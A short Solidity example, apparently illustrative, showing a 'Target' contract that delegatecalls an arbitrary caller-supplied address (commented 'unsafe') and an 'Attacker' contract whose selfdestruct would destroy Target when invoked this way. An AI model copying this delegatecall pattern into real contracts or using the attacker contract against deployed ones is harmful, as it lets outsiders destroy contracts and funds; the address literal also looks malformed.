contract Attacker
{
    function doWork() external
    {
        selfdestruct(0xff9037509);
    }
}

contract Target
{
    function doWork(address _internalWorker) public
    {
        // unsafe
        _internalWorker.delegatecall(bytes4(keccak256("doWork()")));
    }
}
